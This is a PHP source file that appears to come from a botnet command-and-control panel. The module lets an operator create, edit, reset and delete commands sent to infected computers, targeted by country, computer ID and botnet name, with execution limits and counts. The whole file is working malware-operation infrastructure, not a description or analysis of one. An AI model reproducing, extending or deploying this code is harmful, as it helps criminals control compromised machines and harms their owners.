<?php if(!defined('__INDEX__'))die();
$pedt=PRIV&PRIV_BOTS_CMDS_EDIT;
if((isset($_GET['new'])&&$pedt)||(isset($_GET['edit'])&&is_numeric($_GET['edit'])))
{
  if(!@include_once('fmt.php'))die('fmt.php not founded!');
  $name=isset($_POST['name'])?$_POST['name']:time();
  $stat=isset($_POST['stat'])?($_POST['stat']?1:0):0;
  $limit=(isset($_POST['limit'])&&is_numeric($_POST['limit']))?$_POST['limit']:0;
  $cnts=isset($_POST['cnts'])?$_POST['cnts']:'';
  $cids=isset($_POST['cids'])?$_POST['cids']:'';
  $bns=isset($_POST['bns'])?$_POST['bns']:'';
  $cmds=isset($_POST['cmds'])?$_POST['cmds']:'';

  if($_SERVER['REQUEST_METHOD']=='POST'&&strlen($name)>0&&$pedt)
  {
    $cmdsb=EncodeBuffer(str_replace("\r\n","\n",trim($cmds)));
    $data='name=\''.addslashes($name).'\',stat='.$stat.',lim='.$limit.',c=\''.addslashes(SepFmt($cnts)).'\',comps=\''.addslashes(SepFmt($cids)).'\',bns=\''.addslashes(SepFmt($bns)).'\',cmds=\''.addslashes($cmdsb).'\'';
    if(isset($_GET['new']))mysql_query('INSERT INTO '.TABLE_BCMDS.' SET '.$data.',id2='.time());
    else mysql_query('UPDATE '.TABLE_BCMDS.' SET '.$data.' WHERE id=\''.$_GET['edit'].'\' LIMIT 1');
    header('Location: '.QUERY_STRING);
  }
  else
  {
    if(!$pedt&&isset($_GET['new']))unset($_GET['new']);
    HTMLBegin(isset($_GET['new'])?LNG_MBCMDS_NEWCMD:($pedt?LNG_MBCMDS_EDITCMD:LNG_MBCMDS_VIEWCMD));  
    if(isset($_GET['new']))print CmdForm('new',LNG_MBCMDS_NEWCMD,LNG_MBCMDS_ADD,$name,$stat,$limit,$cnts,$cids,$bns,$cmds);
    else
    {
      $r=mysql_query('SELECT * FROM '.TABLE_BCMDS.' WHERE id=\''.$_GET['edit'].'\' LIMIT 1');
      if($r&&mysql_affected_rows()==1&&($m=mysql_fetch_assoc($r)))print CmdForm('edit='.$_GET['edit'],$pedt?LNG_MBCMDS_EDITCMD:LNG_MBCMDS_VIEWCMD,$pedt?LNG_MBCMDS_EDIT:'',$m['name'],$m['stat'],$m['lim'],SepFmtB($m['c']),SepFmtB($m['comps']),SepFmtB($m['bns']),DecodeBuffer($m['cmds']));
      else print '<font class="error">'.LNG_MBCMDS_ERROR_1.'</font>';
    }
    HTMLEnd();
  }
  die();
}
else if(isset($_GET['del'])&&is_numeric($_GET['del'])&&$pedt)
{
  mysql_query('DELETE FROM  '.TABLE_BCMDS.' WHERE id='.$_GET['del'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();  
}
else if(isset($_GET['res'])&&is_numeric($_GET['res'])&&$pedt)
{
  mysql_query('UPDATE '.TABLE_BCMDS.' SET exc=\'0\',rcomps=\'\',exct=\'0\' WHERE id='.$_GET['res'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();
}

HTMLBegin(LNG_MBCMDS,$pedt?'function DelCmd(uid,q){if(confirm(q))window.location=\''.QUERY_STRING.'&del=\'+uid;};function ResCmd(uid,q){if(confirm(q))window.location=\''.QUERY_STRING.'&res=\'+uid;}':'');

$r=mysql_query('SELECT * FROM '.TABLE_BCMDS);      
$total=mysql_affected_rows();
print '<table class="tbl1"><tr><td class="td1" colspan="'.($pedt?9:10).'">'.LNG_MBCMDS_R_CMDS.'&nbsp;('.$total.')</td>';
if($pedt)print '<td class="td1" align="center"><input type="submit" value="'.LNG_MBCMDS_NEWCMD.'" class="ism" style="width:100%" onClick="window.location=\''.QUERY_STRING.'&new\';"></td>';
print '</tr><tr><td class="td1">'.LNG_MBCMDS_R_ID.'</td><td class="td1">'.LNG_MBCMDS_R_NAME.'</td><td class="td1">'.LNG_MBCMDS_R_STAT.'</td><td class="td1">'.LNG_MBCMDS_R_LIMIT.'</td><td class="td1">'.LNG_MBCMDS_R_REQ.'</td><td class="td1">'.LNG_MBCMDS_R_EXEC.'</td><td class="td1">'.LNG_MBCMDS_R_CNTS.'</td><td class="td1">'.LNG_MBCMDS_R_CIDS.'</td><td class="td1">'.LNG_MBCMDS_R_BNS.'</td><td class="td1">&nbsp;</td></tr>';
if($total>0)
{
  $j=0;
  while(($m=mysql_fetch_assoc($r)))
  {
    $a=(($j++)%2==0?1:2);
    print '<tr valign="top"><td align="right" class="tdx'.$a.'">'.$m['id2'].'</td>'.
          '<td class="tdx'.$a.'">'.htmlentities($m['name']).'</td>'.
          '<td class="tdx'.$a.'">'.($m['stat']?LNG_MBCMDS_STAT_ON:LNG_MBCMDS_STAT_OFF).'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['lim'].'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['exc'].'</td>'.
          '<td align="right" class="tdx'.$a.'">'.$m['exct'].'</td>'.
          '<td class="tdx'.$a.'">'.($m['c']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['c'])))).'</td>'.
          '<td class="tdx'.$a.'">'.($m['comps']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['comps'])))).'</td>'.
          '<td class="tdx'.$a.'">'.($m['bns']==''?'-':str_replace(',','<br>',htmlentities(SepFmtB($m['bns'])))).'</td>'.
          '<td class="tdx'.$a.'" align="center"><input class="ism" style="width:90%" type="submit" value="'.($pedt?LNG_MBCMDS_R_EDIT:LNG_MBCMDS_R_VIEW).'" onClick="window.location=\''.QUERY_STRING.'&edit='.$m['id'].'\';return false;">';
    if($pedt)print '<br><input class="ism" style="width:90%" type="submit" value="'.LNG_MBCMDS_R_RES_OK.'" onClick="javascript:ResCmd(\''.$m['id'].'\',\''.addslashes(sprintf(LNG_MBCMDS_R_RES,$m['name'])).'\');return false;"><br><input class="ism" style="width:90%" type="submit" value="'.LNG_MBCMDS_R_DEL_OK.'" onClick="javascript:DelCmd(\''.$m['id'].'\',\''.addslashes(sprintf(LNG_MBCMDS_R_DEL,$m['name'])).'\');return false;">';
    print '</td></tr>';
  }
}
else print '<tr><td align="center" colspan="10" class="tdx1"><i>'.LNG_MBCMDS_R_NONE.'</i></td></tr>';
print '</table>';
HTMLEnd();

function CmdForm($cmd,$title,$action,$name,$stat,$limit,$cnts,$cids,$bns,$cmds)
{
  $en=$action==''?0:1;
  $stat=$stat?1:0;
  $ro=$en?'':'readonly ';
  
  $str=$en?'<form method="POST" action="'.QUERY_STRING.'&'.$cmd.'">':'';
  $str.='<table class="tbl1" width="350"><tr><td class="td1" colspan="2">'.$title.'</td></tr>'.
        '<tr><td>'.LNG_MBCMDS_NAME.'</td><td width="100%"><input '.$ro.'type="text" name="name" value="'.htmlentities($name).'" style="width:100%"></td></tr>'.
        '<tr><td colspan="2"><table class="tbl1"><tr><td>'.LNG_MBCMDS_STAT.'</td><td width="100%"><select '.($en?'':'disabled ').'name="stat" style="width:100%">'.
        '<option value="1"'.($stat==1?' selected':'').'>'.LNG_MBCMDS_STAT_ON.'</option>'.
        '<option value="0"'.($stat==0?' selected':'').'>'.LNG_MBCMDS_STAT_OFF.'</option>'.
        '</select></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_LIMIT.'</td><td width="100%"><input '.$ro.'type="text" name="limit" value="'.$limit.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_CNTS.'</td><td width="100%"><input '.$ro.'type="text" name="cnts" value="'.$cnts.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_CIDS.'</td><td width="100%"><input '.$ro.'type="text" name="cids" value="'.$cids.'" style="width:100%"></td></tr>'.
        '<tr><td>'.LNG_MBCMDS_BNS.'</td><td width="100%"><input '.$ro.'type="text" name="bns" value="'.$bns.'" style="width:100%"></td></tr>'.
        '<tr><td valign="top">'.LNG_MBCMDS_CMDS.'</td><td><textarea wrap="off" '.$ro.'name="cmds" style="width:100%;height:100">'.htmlentities($cmds).'</textarea></td></tr>'.
        '</table></tr></td><tr><td colspan="2" align="right">';
  if($en)$str.='<input type="submit" class="ism" value="'.$action.'" style="width:100">&nbsp;';
  $str.='<input type="submit" class="ism" value="'.LNG_MBCMDS_BACK.'" style="width:100" onClick="window.location.href=\''.QUERY_STRING.'\';return false;"></td></tr>';
  if($en)$str.='</form>';
  return $str.'</table>';
}
function SepFmt($str){if(strlen($str)>1){$str=str_replace(',','|',trim($str));if($str[0]!='|')$str='|'.$str;if($str[strlen($str)-1]!='|')$str.='|';}return $str;}
function SepFmtB($str){if(strlen($str)>1){$str=str_replace('|',',',trim($str));if($str[0]==',')$str=substr($str,1);$l=strlen($str);if($str[$l-1]==',')$str=substr($str,0,$l-1);}return $str;}
?>